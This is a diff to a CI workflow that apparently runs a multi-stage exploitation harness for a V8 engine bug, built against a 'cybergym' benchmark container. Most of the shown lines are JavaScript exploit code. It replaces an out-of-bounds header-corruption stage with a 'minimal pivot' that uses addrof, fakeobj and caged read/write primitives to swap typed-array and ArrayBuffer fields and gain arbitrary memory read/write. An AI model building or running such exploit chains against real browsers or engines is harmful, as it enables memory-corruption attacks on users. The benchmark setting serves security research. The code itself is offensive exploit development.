@@ -1,6 +1,6 @@
 # V8-446124892 Official PoC Test — multi-stage exploitation harness
-# Revised: Stage B = d=32 OOB/overlap + Stage B3 OOB header/pointer pivot.
-# ABS_RW_OK only on proven OOB pivot; exec/flag not claimed without evidence.
+# Revised: Stage B = d=32 OOB/overlap + Stage B3 minimal abs-R/W pivot.
+# ABS_RW_OK only on proven alias; exec/flag not claimed without evidence.
 # Target: cybergym/v8:human-446124892-nosandbox-buildable
 #
 # Stages
@@ -4033,7 +4033,7 @@ jobs:
 
 
 
-      - name: Test 10a — Build Stage B script (d=32 + header pivot)
+      - name: Test 10a — Build Stage B script (d=32 + minimal pivot)
         id: stage_b_build
         run: |
           set +e
@@ -4041,7 +4041,7 @@ jobs:
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
           banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          banner "TEST 10 / STAGE B — d=32 OOB/overlap + OOB header pivot"
+          banner "TEST 10 / STAGE B — d=32 OOB/overlap + minimal pivot"
           mkdir -p /tmp/out
           docker exec "$CONTAINER" sh -c 'mkdir -p /tmp /workspace' 2>/dev/null || true
           # Ensure container is up
@@ -4102,7 +4102,7 @@ jobs:
           // ABS_RW_OK=1 only if alias or known-constant proof succeeds. No fake exec/flag.
           (function stageB() {
             print("[*] STAGE_B_BEGIN");
-            print("[*] NEXT_STEP=oob_header_pointer_pivot");
+            print("[*] NEXT_STEP=minimal_abs_rw_pivot");
             if (typeof instance === "undefined" || !instance.exports) {
               print("[-] STAGE_B_NO_INSTANCE");
               print("[*] OOB_OK=0");
@@ -4266,188 +4266,146 @@ jobs:
               print("[*] STAGE_B2_SKIP_OOB reason=no_length_hit");
             }
 
-            // ===== STAGE B3: OOB header/pointer pivot discovery =====
-            // Prior B3 field-alias (caged_write on addrof(ab)+d) failed.
-            // Next: corrupt OOB indices NEAR victim markers (headers / ptr pairs),
-            // restore always. ABS_RW_OK only on write-through or clear pivot.
-            print("[*] STAGE_B3_OOB_HEADER_PIVOT");
+            // ===== STAGE B3: minimal abs-R/W pivot (agent-style short path) =====
+            // After d=32 OOB/overlap: try TA/AB field swaps + light OOB rel probes.
+            // ABS_RW_OK=1 only on write-through alias. No exec/flag claims.
+            print("[*] STAGE_B3_MINIMAL_PIVOT");
             let STORE_CANDIDATES = 0;
             let ALIAS_ATTEMPTS = 0;
             let HEADER_HITS = 0;
             let PIVOT_OK = 0;
+            ABS_RW_OK = 0;
+            ABS_RW_METHOD = "none";
 
             if (OOB_OK === 1) {
-              let abO = new ArrayBuffer(0x1000);
-              let oob = new Uint32Array(abO);
-              let taO = addrof(oob)|0;
-              let slotO = (taO + 32)|0;
-              let oldO = safe_read(slotO);
-              if (oldO !== null) {
-                safe_write(slotO, 0x200); // larger window
-                let vics = [];
+              print("[*] MINIMAL_PIVOT_BEGIN");
+              // Fresh OOB + two victims
+              let abP = new ArrayBuffer(0x1000);
+              let oobP = new Uint32Array(abP);
+              let taP = addrof(oobP)|0;
+              let slotP = (taP + 32)|0;
+              let oldP = safe_read(slotP);
+              if (oldP !== null) {
+                safe_write(slotP, 0x200);
+                let vA = new Uint32Array(new ArrayBuffer(0x100));
+                let vB = new Uint32Array(new ArrayBuffer(0x100));
                 for (let i = 0; i < 32; i++) {
-                  let a = new ArrayBuffer(0x80);
-                  let v = new Uint32Array(a);
-                  v[0] = 0xBEEF0000 + i;
-                  v[1] = 0xCAFE0000 + i;
-                  v[2] = 0x11110000 + i;
-                  vics.push({ab: a, ta: v, aaddr: addrof(a)|0, taddr: addrof(v)|0});
+                  vA[i] = 0xA0000000 + i;
+                  vB[i] = 0xB0000000 + i;
                 }
-                let hit = -1, hid = -1;
-                let lim = Math.min(oob.length|0, 0x20000);
-                for (let i = 0; i < lim; i++) {
-                  let x = oob[i]|0;
-                  if (((x >>> 16) & 0xFFFF) === 0xBEEF) {
-                    hit = i; hid = x & 0xFFFF;
-                    print("[+] B3 marker oob[" + i + "] id=" + hid);
-                    break;
-                  }
+                vA[0] = 0x11111111;
+                vB[0] = 0x22222222;
+                let addrA = addrof(vA)|0, addrB = addrof(vB)|0;
+                let abA = addrof(vA.buffer)|0, abB = addrof(vB.buffer)|0;
+                print("[*] vA ta=" + hex(addrA) + " ab=" + hex(abA));
+                print("[*] vB ta=" + hex(addrB) + " ab=" + hex(abB));
+
+                let hitA = -1;
+                let limP = Math.min(oobP.length|0, 0x20000);
+                for (let i = 0; i < limP; i++) {
+                  if ((oobP[i]|0) === (0x11111111|0)) { hitA = i; break; }
                 }
-                if (hit < 0) {
-                  print("[-] B3 no BEEF marker");
-                } else {
-                  let lo = hit - 48; if (lo < 0) lo = 0;
-                  let hi = hit + 64; if (hi > lim) hi = lim;
-                  let wline = "OOB_WINDOW " + lo + ".." + hi + ":";
-                  for (let i = lo; i < hi; i++) wline += " [" + i + "]=" + hex(oob[i]|0);
-                  print(wline);
+                print("[*] OOB hitA=" + hitA);
 
-                  if (hid >= 0 && hid < vics.length) {
-                    let V = vics[hid];
-                    let abl = "AB_FIELDS @" + hex(V.aaddr) + ":";
-                    for (let d = 0; d <= 0x40; d += 4) {
-                      let vv = safe_read((V.aaddr + d)|0);
-                      if (vv !== null) abl += " [" + d + "]=" + hex(vv);
-                    }
-                    print(abl);
-                    let tal = "TA_FIELDS @" + hex(V.taddr) + ":";
-                    for (let d = 0; d <= 0x40; d += 4) {
-                      let vv = safe_read((V.taddr + d)|0);
-                      if (vv !== null) tal += " [" + d + "]=" + hex(vv);
-                    }
-                    print(tal);
+                function dump(label, base) {
+                  let s = label + " @" + hex(base) + ":";
+                  for (let d = 0; d <= 0x48; d += 4) {
+                    let v = safe_read((base + d)|0);
+                    if (v !== null) s += " [" + d + "]=" + hex(v);
                   }
+                  print(s);
+                }
+                dump("TA_A", addrA); dump("AB_A", abA);
+                dump("TA_B", addrB); dump("AB_B", abB);
+                if (hitA >= 0) {
+                  let lo = hitA - 16; if (lo < 0) lo = 0;
+                  let hi = hitA + 24; if (hi > limP) hi = limP;
+                  let w = "OOB@" + lo + ".." + hi + ":";
+                  for (let i = lo; i < hi; i++) w += " [" + i + "]=" + hex(oobP[i]|0);
+                  print(w);
+                }
 
-                  // --- OOB-index probes: relative offsets from marker (header region) ---
-                  // Negative offsets = before elements (likely object metadata)
-                  let rels = [-48, -44, -40, -36, -32, -28, -24, -20, -16, -12, -8, -4, 4, 8];
-                  print("[*] B3_OOB_INDEX_PROBES marker=" + hit);
-                  for (let ri = 0; ri < rels.length; ri++) {
-                    let idx = (hit + rels[ri])|0;
-                    if (idx < 0 || idx >= lim) continue;
+                // TA field swaps
+                let taFields = [12, 16, 20, 24, 28, 36, 40, 44, 48];
+                for (let fi = 0; fi < taFields.length && ABS_RW_OK === 0; fi++) {
+                  let d = taFields[fi];
+                  STORE_CANDIDATES++;
+                  let sa = (addrA + d)|0, sb = (addrB + d)|0;
+                  let oa = safe_read(sa), ob = safe_read(sb);
+                  if (oa === null || ob === null) continue;
+                  if ((oa|0) === (ob|0)) continue;
+                  ALIAS_ATTEMPTS++;
+                  if (!safe_write(sa, ob)) continue;
+                  vA[0] = 0x31337377;
+                  let b0 = vB[0]|0;
+                  print("[*] cage_ta_swap d=" + d + " B0=" + hex(b0));
+                  if ((b0|0) === (0x31337377|0)) {
+                    ABS_RW_OK = 1; PIVOT_OK = 1;
+                    ABS_RW_METHOD = "cage_ta_field_" + d;
+                    print("[+] ALIAS_OK " + ABS_RW_METHOD);
+                  }
+                  safe_write(sa, oa);
+                  vA[0] = 0x11111111; vB[0] = 0x22222222;
+                }
+
+                // AB field swaps
+                let abFields = [16, 20, 24, 28, 32, 36, 40, 44];
+                for (let fi = 0; fi < abFields.length && ABS_RW_OK === 0; fi++) {
+                  let d = abFields[fi];
+                  STORE_CANDIDATES++;
+                  let sa = (abA + d)|0, sb = (abB + d)|0;
+                  let oa = safe_read(sa), ob = safe_read(sb);
+                  if (oa === null || ob === null) continue;
+                  ALIAS_ATTEMPTS++;
+                  if (!safe_write(sa, ob)) continue;
+                  vA[0] = 0x31337377;
+                  let b0 = vB[0]|0;
+                  print("[*] cage_ab_swap d=" + d + " B0=" + hex(b0));
+                  if ((b0|0) === (0x31337377|0)) {
+                    ABS_RW_OK = 1; PIVOT_OK = 1;
+                    ABS_RW_METHOD = "cage_ab_field_" + d;
+                    print("[+] ALIAS_OK " + ABS_RW_METHOD);
+                  }
+                  safe_write(sa, oa);
+                  vA[0] = 0x11111111; vB[0] = 0x22222222;
+                }
+
+                // Light OOB relative probes near hitA
+                if (ABS_RW_OK === 0 && hitA >= 0) {
+                  let hitB = -1;
+                  for (let j = hitA + 1; j < limP; j++) {
+                    if ((oobP[j]|0) === (0x22222222|0)) { hitB = j; break; }
+                  }
+                  let rels = [-2, -3, -4, -5, -6, -7, -8, -10, -12, -14, -16];
+                  for (let ri = 0; ri < rels.length && ABS_RW_OK === 0; ri++) {
+                    let idx = (hitA + rels[ri])|0;
+                    if (idx < 0) continue;
                     STORE_CANDIDATES++;
-                    let oldv = oob[idx]|0;
-                    // Skip pure element markers
-                    if (((oldv >>> 16) & 0xFFFF) === 0xBEEF) continue;
-                    if (((oldv >>> 16) & 0xFFFF) === 0xCAFE) continue;
-
-                    // Probe 1: mild bump of low 16 bits (length-like)
                     ALIAS_ATTEMPTS++;
-                    let probe1 = (oldv + 0x10)|0;
-                    oob[idx] = probe1;
-                    let len_chg = "";
-                    let data_chg = "";
-                    if (hid >= 0 && hid < vics.length) {
-                      try {
-                        let L = vics[hid].ta.length|0;
-                        let e0 = vics[hid].ta[0]|0;
-                        let e1 = vics[hid].ta[1]|0;
-                        if (L !== 32) len_chg = " len->" + L;
-                        if ((e0|0) !== ((0xBEEF0000 + hid)|0)) data_chg = " e0->" + hex(e0);
-                        if ((e1|0) !== ((0xCAFE0000 + hid)|0) && data_chg === "") data_chg = " e1->" + hex(e1);
-                      } catch (e) { len_chg = " throw"; }
+                    let oldv = oobP[idx]|0;
+                    if (hitB >= 0) oobP[idx] = hitB;
+                    vA[0] = 0x31337377;
+                    let b0 = vB[0]|0;
+                    if ((b0|0) === (0x31337377|0)) {
+                      ABS_RW_OK = 1; PIVOT_OK = 1;
+                      ABS_RW_METHOD = "oob_rel_" + rels[ri];
+                      print("[+] ALIAS_OK " + ABS_RW_METHOD);
                     }
-                    oob[idx] = oldv; // restore
-                    // restore victim elements if needed
-                    if (hid >= 0 && hid < vics.length) {
-                      try {
-                        vics[hid].ta[0] = 0xBEEF0000 + hid;
-                        vics[hid].ta[1] = 0xCAFE0000 + hid;
-                      } catch (e) {}
-                    }
-                    if (len_chg !== "" || data_chg !== "") {
-                      HEADER_HITS++;
-                      print("[+] OOB_HEADER_HIT idx=" + idx + " rel=" + rels[ri] + " old=" + hex(oldv) + len_chg + data_chg);
-                    }
-
-                    // Probe 2: if we have two victims, try copy pointer-like word from later marker region
-                    if (ABS_RW_OK === 0 && hid >= 0 && hid + 1 < vics.length) {
-                      // find second marker
-                      let hit2 = -1;
-                      for (let j = hit + 8; j < lim; j++) {
-                        let x = oob[j]|0;
-                        if (((x >>> 16) & 0xFFFF) === 0xBEEF && ((x & 0xFFFF) === ((hid + 1)|0))) {
-                          hit2 = j; break;
-                        }
-                      }
-                      if (hit2 >= 0) {
-                        let idx2 = (hit2 + rels[ri])|0;
-                        if (idx2 >= 0 && idx2 < lim) {
-                          ALIAS_ATTEMPTS++;
-                          let other = oob[idx2]|0;
-                          oob[idx] = other;
-                          try {
-                            vics[hid].ta[0] = 0x31337377;
-                            let b0 = vics[hid + 1].ta[0]|0;
-                            let a0 = vics[hid].ta[0]|0;
-                            if ((b0|0) === (0x31337377|0)) {
-                              ABS_RW_OK = 1;
-                              PIVOT_OK = 1;
-                              ABS_RW_METHOD = "oob_header_alias_rel" + rels[ri];
-                              print("[+] ALIAS_WRITE_THROUGH OOB idx=" + idx + " rel=" + rels[ri]);
-                              print("[+] ABS_RW_OK method=" + ABS_RW_METHOD);
-                            }
-                            vics[hid].ta[0] = 0xBEEF0000 + hid;
-                            vics[hid + 1].ta[0] = 0xBEEF0000 + hid + 1;
-                          } catch (e) {
-                            print("[!] alias probe throw " + e);
-                          }
-                          oob[idx] = oldv;
-                          if (ABS_RW_OK === 1) break;
-                        }
-                      }
-                    }
-                  }
-
-                  // --- Extra: corrupt 64-bit-looking pairs (lo at idx, hi at idx+1) ---
-                  // Look for hi words like 0x7ffc / 0x6027 near marker and swap lo with peer
-                  if (ABS_RW_OK === 0) {
-                    print("[*] B3_PTR_PAIR_PROBES");
-                    for (let off = -40; off <= -4; off += 4) {
-                      let idx = (hit + off)|0;
-                      if (idx < 0 || idx + 1 >= lim) continue;
-                      let lo = oob[idx]|0;
-                      let hi = oob[idx + 1]|0;
-                      // pointer-ish hi
-                      if (!((hi === 0x7ffc) || (hi === 0x6027) || ((hi & 0xffff) === 0x6027) || (hi > 0x5000 && hi < 0x8000))) {
-                        continue;
-                      }
-                      STORE_CANDIDATES++;
-                      ALIAS_ATTEMPTS++;
-                      print("[*] ptr_pair idx=" + idx + " lo=" + hex(lo) + " hi=" + hex(hi));
-                      // mild: flip low bits of lo only
-                      let old_lo = lo;
-                      oob[idx] = (lo ^ 0x40)|0;
-                      let effected = false;
-                      if (hid >= 0 && hid < vics.length) {
-                        try {
-                          let e0 = vics[hid].ta[0]|0;
-                          if ((e0|0) !== ((0xBEEF0000 + hid)|0)) {
-                            effected = true;
-                            HEADER_HITS++;
-                            print("[+] PTR_PAIR_HIT idx=" + idx + " e0=" + hex(e0));
-                          }
-                        } catch (e) {}
-                      }
-                      oob[idx] = old_lo;
-                      if (hid >= 0 && hid < vics.length) {
-                        try { vics[hid].ta[0] = 0xBEEF0000 + hid; } catch (e) {}
-                      }
-                    }
+                    oobP[idx] = oldv;
+                    vA[0] = 0x11111111; vB[0] = 0x22222222;
                   }
                 }
-                safe_write(slotO, oldO);
+
+                try {
+                  let x = {};
+                  let ax = addrof(x)|0;
+                  let y = fakeobj(ax);
+                  print("[*] fakeobj smoke addrof=" + hex(ax) + " ok=" + (typeof y === "object"));
+                } catch (e) { print("[!] fakeobj " + e); }
+
+                safe_write(slotP, oldP);
               }
+              print("[*] MINIMAL_PIVOT_END");
             } else {
               print("[*] STAGE_B3_SKIP reason=no_oob");
             }
@@ -4463,9 +4421,9 @@ jobs:
             print("[*] ABS_RW_OK=" + ABS_RW_OK);
             print("[*] ABS_RW_METHOD=" + ABS_RW_METHOD);
             if (ABS_RW_OK === 1) {
-              print("[*] NOTE=abs_rw_oob_header_pivot_proven");
+              print("[*] NOTE=minimal_pivot_alias_proven");
             } else {
-              print("[*] NOTE=oob_header_probe_done_abs_rw_pending");
+              print("[*] NOTE=minimal_pivot_done_abs_rw_pending");
             }
             print("[*] STAGE_B_END");
           })();
